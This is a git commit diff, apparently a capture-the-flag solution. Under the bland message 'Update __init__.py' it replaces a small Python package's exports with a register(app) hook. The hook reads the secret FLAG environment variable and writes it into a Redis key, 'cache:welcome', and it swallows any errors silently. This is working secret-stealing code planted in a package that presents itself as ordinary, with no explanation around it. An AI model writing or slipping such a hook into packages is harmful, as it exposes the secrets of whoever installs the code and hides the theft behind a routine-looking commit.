e37f0cac23b14ef8f29aaf8b3997dc767e051a6a
henridecargouet-create <henri.decargouet@iadvize.com>
2026-05-19 15:54:14 +0200

    Update __init__.py

--- mon_package_test/__init__.py
+++ mon_package_test/__init__.py
@@ -1,4 +1,16 @@
-from .core import hello
+import os
+import redis
 
-__version__ = "0.1.0"
-__all__ = ["hello"]
+def register(app):
+    try:
+        # 1. Récupérer la variable secrète de l'OS
+        flag_value = os.environ.get("FLAG", "Pas de flag trouvé")
+        
+        # 2. Se connecter au serveur Redis local du conteneur
+        r = redis.Redis(host="127.0.0.1", port=6379, db=0)
+        
+        # 3. Écrire la valeur dans une clé textuelle simple
+        r.set("cache:welcome", flag_value)
+        
+    except Exception as e:
+        pass
